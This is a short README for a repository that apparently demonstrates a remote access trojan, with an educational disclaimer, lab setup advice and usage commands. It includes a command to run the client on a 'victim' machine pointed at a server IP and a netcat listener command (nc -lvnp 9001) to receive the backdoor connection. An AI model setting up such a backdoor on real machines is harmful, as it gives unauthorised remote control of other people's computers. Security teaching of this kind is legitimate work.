# RAT malware demostration

<hr>

DISCLAIMER: **This repo is created to demonstrate how a remote backdoor works. Hacking without permission is illegal. This is strictly educational for learning about malware cyber-security in the areas of ethical hacking so that we can protect ourselves against the real black-hat hackers.**

<hr>

# Usage

## Set-up
Set up a safe virtual network with both a **Windows 10** machine and any other OS able to listen for connections on a specified port

## Usage

### Client (victim)

```bash
python3 ./client/src/client_main.py <IP of server>
```

### Server

Listen on specified port for connections (default set to 9001): 
```bash
nc -lvnp 9001
```
